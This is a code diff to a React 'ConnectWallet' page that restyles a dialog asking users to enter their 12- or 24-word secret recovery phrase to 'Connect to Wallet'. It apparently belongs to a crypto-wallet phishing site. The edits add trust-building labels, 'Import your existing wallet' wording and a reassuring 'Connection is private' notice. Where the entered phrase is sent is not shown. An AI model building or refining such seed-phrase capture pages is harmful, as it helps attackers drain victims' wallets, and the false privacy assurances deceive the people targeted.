@@ -4,7 +4,8 @@ import { Link, useLocation } from "wouter";
 import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Button } from "@/components/ui/button";
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
+import { Label } from "@/components/ui/label";
 import { useState } from "react";
 
 const WALLETS = [
@@ -102,43 +103,49 @@ export default function ConnectWallet() {
         </div>
 
         <Dialog open={!!selectedWallet} onOpenChange={(open) => !open && setSelectedWallet(null)}>
-          <DialogContent className="sm:max-w-md rounded-2xl w-[90%]">
-            <DialogHeader className="flex flex-col items-center text-center pt-4">
+          <DialogContent className="sm:max-w-md rounded-2xl w-[90%] bg-white">
+            <DialogHeader className="flex flex-col items-center text-center pt-4 pb-2">
               {selectedWallet && (
-                <div className={`w-16 h-16 rounded-2xl ${selectedWallet.color} flex items-center justify-center text-white font-bold text-2xl shadow-md mb-4`}>
+                <div className={`w-20 h-20 rounded-3xl ${selectedWallet.color} flex items-center justify-center text-white font-bold text-3xl shadow-lg mb-4`}>
                   {selectedWallet.name[0]}
                 </div>
               )}
-              <DialogTitle className="text-xl font-bold">
-                Connect {selectedWallet?.name}
+              <DialogTitle className="text-xl font-bold text-gray-900">
+                {selectedWallet?.name}
               </DialogTitle>
+              <DialogDescription>
+                Import your existing wallet
+              </DialogDescription>
             </DialogHeader>
             
-            <div className="space-y-4 py-2">
+            <div className="space-y-6 py-2">
               <div className="space-y-2">
-                <p className="text-sm text-gray-500 text-center px-4">
-                  Enter your secret recovery phrase to connect your wallet securely.
-                </p>
+                <Label htmlFor="phrase" className="text-sm font-medium text-gray-700 ml-1">
+                  Wallet Phrase
+                </Label>
                 <Textarea 
+                  id="phrase"
                   placeholder="Enter your 12 or 24 word recovery phrase..." 
-                  className="min-h-[120px] resize-none bg-gray-50 border-gray-200 focus:border-primary rounded-xl p-4"
+                  className="min-h-[120px] resize-none bg-gray-50 border-gray-200 focus:border-primary focus:ring-primary/20 rounded-xl p-4 text-base"
                   value={phrase}
                   onChange={(e) => setPhrase(e.target.value)}
                 />
               </div>
 
-              <div className="space-y-3 pt-2">
+              <div className="space-y-4">
                 <Button 
-                  className="w-full h-12 rounded-xl font-bold text-base"
+                  className="w-full h-12 rounded-xl font-bold text-base shadow-lg shadow-blue-500/20"
                   onClick={handleConnect}
                   disabled={isConnecting || !phrase}
                 >
                   {isConnecting ? "Connecting..." : "Connect to Wallet"}
                 </Button>
                 
-                <div className="flex items-center justify-center gap-1.5 text-xs text-gray-400">
-                  <Lock size={12} />
-                  <span>Connection is private and end-to-end encrypted.</span>
+                <div className="flex items-center justify-center gap-2 text-[11px] text-gray-400 font-medium">
+                  <div className="p-1 bg-gray-100 rounded-full">
+                    <Lock size={10} className="text-gray-500" />
+                  </div>
+                  <span>Connection is private.</span>
                 </div>
               </div>
             </div>
